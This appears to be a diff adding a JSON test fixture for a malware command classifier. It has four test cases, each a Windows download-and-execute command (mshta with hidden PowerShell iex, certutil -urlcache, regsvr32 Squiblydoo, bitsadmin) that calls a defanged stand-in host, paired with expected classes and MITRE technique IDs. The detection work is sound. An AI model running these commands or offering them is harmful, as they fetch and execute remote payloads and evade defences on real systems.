@@ -1,0 +1,46 @@
+[
+  {
+    "id": "clickfix-mshta-js",
+    "description": "ClickFix mshta javascript: scheme executing hidden PowerShell download",
+    "command": "mshta \"javascript:close();var r=new ActiveXObject('WScript.Shell');r.Run('powershell -ep bypass -w hidden -c \\\"iex((New-Object Net.WebClient).DownloadString(\\\"hxxps://cdn.update-browser[.]xyz/fix.ps1\\\"))\\\"\\'',0,true);\"",
+    "expect": {
+      "classes": ["loader", "dropper", "defense_evasion"],
+      "min_confidence": {"loader": "high", "dropper": "high"},
+      "techniques": ["T1218.005", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "certutil-urlcache-download",
+    "description": "certutil -urlcache LOLbin file download and execute",
+    "command": "certutil.exe -urlcache -split -f hxxp://cdn.delivery-update[.]xyz/update.exe C:\\Windows\\Temp\\svchost32.exe & C:\\Windows\\Temp\\svchost32.exe",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1105"]
+    },
+    "reject": {"classes": ["impact"]}
+  },
+  {
+    "id": "regsvr32-squiblydoo",
+    "description": "Squiblydoo — regsvr32 loading remote COM scriptlet, bypasses AppLocker",
+    "command": "regsvr32.exe /s /n /u /i:hxxp://cdn.malware-dl[.]xyz/payload.sct scrobj.dll",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.010"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "bitsadmin-transfer",
+    "description": "bitsadmin BITS job used as LOLbin downloader",
+    "command": "bitsadmin /transfer \"WindowsUpdate\" /download /priority normal hxxp://update-svc[.]xyz/patch.exe C:\\Windows\\Temp\\patch.exe & C:\\Windows\\Temp\\patch.exe /quiet",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1197"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  }
+]
